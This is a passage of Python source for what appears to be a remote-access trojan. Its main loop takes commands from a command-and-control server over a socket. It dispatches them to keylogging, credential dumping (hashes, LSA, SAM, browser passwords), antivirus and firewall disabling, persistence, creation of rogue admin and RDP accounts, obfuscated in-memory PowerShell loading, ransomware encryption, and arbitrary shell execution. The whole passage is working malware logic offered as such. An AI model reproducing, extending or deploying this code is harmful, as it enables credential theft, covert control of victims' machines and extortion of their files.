    Delete_In_Server(id)
    s.send(b"[RANSOMWARE] Decryption complete. Ransom note removed.\n" + chariot)


# ============================================
# BOUCLE PRINCIPALE - COMMAND HANDLER
# ============================================

# Boucle principale qui reçoit les commandes du serveur C2 et les traite
while True:
    cwd = os.getcwd()
    s.send(f'[NATIVE] {cwd} - $ '.encode())
    command = s.recv(1024).decode('utf-8')
    if (command == 'exit\n'):
        break
    elif command.startswith('cd '):
        try:
            command = command.strip()
            os.chdir(command[3:])
        except FileNotFoundError as e:
            s.send(f'Error: {str(e)}\n'.encode())
    elif (command == "clear\n"):
        Clear_Screen()
    elif (command == "sysinfo\n"):
        Get_SysInfo()
    elif (command == "arpscan\n"):
        ARP_Scan()
    elif (command.startswith("read ")):
        filepath = command[5:].strip()
        Read_File(filepath)
    elif (command.startswith("netstat")):
        if (command == "netstat\n"):
            NetStat("inet")
            s.send(chariot + chariot)
        elif (command.startswith("netstat ")):
            kind = command.split(" ")[1].strip()
            NetStat(kind)
            s.send(chariot + chariot)
    elif command.startswith("portscan "):
        parts = command[9:].strip().split(" ", 1)
        if len(parts) >= 2:
            start_port = int(parts[0])
            end_port = int(parts[1])
        else:
            start_port = 1
            end_port = 1024
        Port_Scan(start_port, end_port) 
    elif command.startswith("remoteportscan "):
        parts = command[15:].strip().split(" ", 2)
        if len(parts) >= 3:
            target_ip = parts[0]
            start_port = int(parts[1])
            end_port = int(parts[2])
        else:
            target_ip = parts[0]
            start_port = 1
            end_port = 1024
        Remote_Port_Scan(target_ip, start_port, end_port)
    elif command.startswith("download "):
        filename = command[9:].strip()
        Download_File(filename)
    elif command.startswith("upload "):
        filepath = command[7:].strip()
        Upload_File(filepath)
    elif command.startswith("zipupload "):
        directory = command[10:].strip()
        ZIP_Upload(directory)
    elif (command == "addschedule\n"):
        Add_Scheduled()
    elif (command == "addstartup\n"):
        Add_Startup()
    elif (command.startswith("rdp ")):
        On_Off = command[4:].strip().lower()
        Turn_RDP_On_Off(On_Off)
    elif (command.startswith("createlocaluser ")):
        parts = command[len("createlocaluser "):].strip().split(" ", 1)
        if len(parts) >= 2:
            username = parts[0]
            password = parts[1]
            Create_User("createlocaluser", username, password)
    elif (command.startswith("createdomainuser ")):
        parts = command[len("createdomainuser "):].strip().split(" ", 1)
        if len(parts) >= 2:
            username = parts[0]
            password = parts[1]
            Create_User("createdomainuser", username, password)
    elif (command.startswith("rdpgroupadd ")):
        username = command[len("rdpgroupadd "):].strip()
        RDP_Group_Add(username)
    elif (command.startswith("admingroupadd ")):
        parts = command[len("admingroupadd "):].strip().split(" ", 1)
        if len(parts) >= 2:
            method = parts[0]
            username = parts[1]
            Admin_Group_Add(method, username)
    elif (command.startswith("search ")):
        args = command[7:].strip().split(" ", 1)
        pathtosearch = args[0]
        filedirname = args[1]
        Search_File(pathtosearch, filedirname)
    elif (command == "getscreen\n"):
        Take_Screenshot(AppData_Path_Screen)
    elif (command.startswith("loadmodule ")):
        module_name = command[len("loadmodule "):].strip()
        Load_Module(module_name)
    elif (command.startswith("loadpwshmodule ")):
        module_name = command[len("loadpwshmodule "):].strip()
        Load_Pwsh_Module(module_name)
    elif (command.startswith("loadobfpwshmodule ")):
        module_name = command[len("loadobfpwshmodule "):].strip()
        Load_Obf_Pwsh_Module(module_name)
    elif (command.startswith("removemodule ")):
        module_name = command[len("removemodule "):].strip()
        Remove_Module(module_name)
    elif (command.startswith("runmodule ")):
        args = command[len("runmodule "):].strip().split(" ", 1)
        module_name = args[0]
        module_args = args[1] if len(args) > 1 else ""
        Run_Module(module_name, module_args)
    elif (command.startswith("runpwshmodule ")):
        args = command[len("runpwshmodule "):].strip().split(" ", 1)
        module_name = args[0]
        module_args = args[1] if len(args) > 1 else ""
        Run_Pwsh_Module(module_name, module_args)
    elif (command.startswith("loadrunmempwshmodule ")):
        args = command[len("loadrunmempwshmodule "):].strip().split(" ", 1)
        module_name = args[0]
        module_args = args[1] if len(args) > 1 else ""
        Load_Run_Memory_Pwsh_Module(module_name, module_args)
    elif (command.startswith("runobfpwshmodule ")):
        args = command[len("runobfpwshmodule "):].strip().split(" ", 1)
        module_name = args[0]
        module_args = args[1] if len(args) > 1 else ""
        Run_Obf_Pwsh_Module(module_name, module_args)
    elif (command.startswith("loadrunobfmempwshmodule ")):
        args = command[len("loadrunobfmempwshmodule "):].strip().split(" ", 1)
        module_name = args[0]
        module_args = args[1] if len(args) > 1 else ""
        Load_Run_Obf_Memory_Pwsh_Module(module_name, module_args)
    elif (command == "startkeylogger\n"):
        StartKeyLogger()
    elif (command == "stopkeylogger\n"):
        StopKeyLogger()
    elif (command.startswith("av ")):
        On_Off = command[3:].strip().lower()
        On_Off_AV(On_Off)
    elif (command.startswith("fw ")):
        On_Off = command[3:].strip().lower()
        On_Off_FW(On_Off)
    elif (command == "ps\n"):
        Process_List()
    elif (command.startswith("dump ")):
        pid = command[5:].strip()
        Dump_Process_Memory(pid)
    elif (command == "hashdump\n"):
        HashDump()
    elif (command == "lsadump\n"):
        Lsa_Dump()
    elif (command == "samdump\n"):
        Sam_Dump()
    elif (command == "dumpnav\n"):
        Dump_Navigators_Credentials()
    elif (command == "getprivs\n"):
        Enable_All_Privileges()
    elif (command == "getsystem\n"):
        Get_System()
    elif (command == "whoami\n"):
        Whoami()
    elif (command == "pwsh\n"):
        Open_PowerShell()
    elif (command == "cmd\n"):
        Open_CMD()
    elif (command.startswith("startransom")):
        if (command == "startransom\n"):
            user = getpass.getuser()
            path_to_files = "C:\\Users\\" + user
            Start_Ransomware(path_to_files)
        elif (command.startswith("startransom ")):
            path_to_files = command[len("startransom "):].strip()
            Start_Ransomware(path_to_files)
    elif (command.startswith("stopransom")):
        if (command == "stopransom\n"):
            user = getpass.getuser()
            path_to_files = "C:\\Users\\" + user
            Stop_Ransomware(path_to_files)
        elif (command.startswith("stopransom ")):
            path_to_files = command[len("stopransom "):].strip()
            Stop_Ransomware(path_to_files)
    elif (command == "help\n"):
        s.send(chariot + help_menu.encode('utf-8') + chariot)
    else:
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        cmd = process.stdout.read() + process.stderr.read()
        s.send(chariot + cmd + chariot)
s.close()